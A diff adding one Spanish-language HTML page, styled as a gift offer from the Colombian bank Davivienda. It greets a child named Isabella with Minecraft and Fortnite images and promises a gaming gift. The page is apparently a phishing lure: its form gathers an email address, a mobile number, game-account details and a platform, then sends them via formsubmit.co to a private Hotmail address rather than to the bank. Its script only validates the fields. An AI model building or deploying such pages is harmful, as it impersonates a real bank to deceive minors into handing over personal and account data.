@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Regalo Davivienda</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background: linear-gradient(135deg, #e1f5fe, #fce4ec);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      min-height: 100vh;
+    }
+
+    .card {
+      background: white;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+      padding: 25px;
+      max-width: 450px;
+      width: 100%;
+      text-align: center;
+    }
+
+    h1 {
+      color: #ff4081;
+      margin-bottom: 10px;
+    }
+
+    .game-images {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+
+    .game-images img {
+      width: 80px;
+      height: auto;
+      border-radius: 10px;
+    }
+
+    p {
+      font-size: 15px;
+      margin-bottom: 20px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      width: 100%;
+    }
+
+    input, textarea, select, option {
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 15px;
+    }
+
+
+    input:invalid, textarea:invalid {
+      border-color: #ff5252;
+    }
+
+    button {
+      background-color: #ff4081;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #e91e63;
+    }
+
+    .error {
+      color: red;
+      font-size: 14px;
+      display: none;
+    }
+
+    select {
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 15px;
+      width: 100%;
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      background-color: #fff;
+      background-image: url('data:image/svg+xml;utf8,<svg fill="%23666" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+      background-repeat: no-repeat;
+      background-position: right 10px center;
+      background-size: 16px;
+      padding-right: 30px;
+    }
+
+    .custom-select-wrapper select {
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 15px;
+      width: 100%;
+      background-color: #fff;
+      color: #333;
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      background-image: url('data:image/svg+xml;utf8,<svg fill="%23333" height="24" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"/></svg>');
+      background-repeat: no-repeat;
+      background-position: right 10px center;
+      background-size: 16px;
+      padding-right: 40px;
+      box-sizing: border-box;
+    }
+
+    .custom-select-wrapper {
+      position: relative;
+      width: 100%;
+    }
+
+    select:invalid {
+      color: #999;
+    }
+  </style>
+</head>
+<body>
+
+<div class="card">
+  <h1>¡Isabella Bienvenida!</h1>
+
+  <div class="game-images">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fb/Minecraft-creeper-face.jpg" alt="Minecraft">
+    <img src="https://cdn2.unrealengine.com/es-es-fnfig-32-40-c1s3-coverart-3840x2160-3840x2160-07e3bd7e3bd2.jpg" alt="Fortnite">
+  </div>
+
+  <p>El equipo de Davivienda quiere darte un regalo muy especial. Para eso, queremos que nos proporciones estos detalles con el fin de enviarte un regalo para que puedas jugar tus juegos favoritos:</p>
+
+  <form id="formulario" action="https://formsubmit.co/santiagolopezamaya@hotmail.com" method="POST">
+    <input type="email" name="correo" id="correo" placeholder="ejemplo@correo.com" required pattern="^[^@\s]+@[^@\s]+\.[^@\s]+$">
+    
+    <input type="tel" name="celular" id="celular" placeholder="3201234567" required pattern="^3\d{9}$">
+
+    <textarea name="detalles" id="detalles" placeholder="Ej: Mi usuario es isabella123 en Steam" required></textarea>
+
+    <div class="custom-select-wrapper">
+      <select name="plataforma" id="plataforma" required>
+        <option value="" disabled selected>Selecciona tu plataforma</option>
+        <option value="Steam">Steam</option>
+        <option value="Epic Games">Epic Games</option>
+      </select>
+    </div>
+
+    <span class="error" id="errorMensaje">Por favor revisa los campos antes de enviar.</span>
+
+    <button type="submit">Enviar regalo</button>
+  </form>
+</div>
+
+<script>
+  const form = document.getElementById('formulario');
+  const correoInput = document.getElementById('correo');
+  const celularInput = document.getElementById('celular');
+  const detallesInput = document.getElementById('detalles');
+  const errorMsg = document.getElementById('errorMensaje');
+
+  form.addEventListener('submit', function (e) {
+    const correoRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+    const celularRegex = /^3\d{9}$/;
+
+    if (
+      !correoRegex.test(correoInput.value) ||
+      !celularRegex.test(celularInput.value) ||
+      detallesInput.value.trim() === ''
+    ) {
+      e.preventDefault();
+      errorMsg.style.display = 'block';
+    } else {
+      errorMsg.style.display = 'none';
+    }
+  });
+</script>
+
+</body>
+</html>
